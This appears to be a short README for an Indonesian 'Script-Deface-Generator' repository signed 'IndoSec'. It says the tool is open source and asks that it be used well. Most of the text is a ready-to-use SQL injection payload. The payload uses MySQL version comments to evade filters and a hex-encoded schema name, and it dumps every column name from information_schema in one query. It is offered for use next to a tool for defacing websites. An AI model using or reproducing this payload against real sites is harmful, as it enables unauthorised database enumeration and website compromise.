# Script-Deface-Generator

Tools ini gw bikin open source, jadi digunakan baik2 ok ^_^

{ IndoSec }
(/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.columns*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000column_name*/)),@))
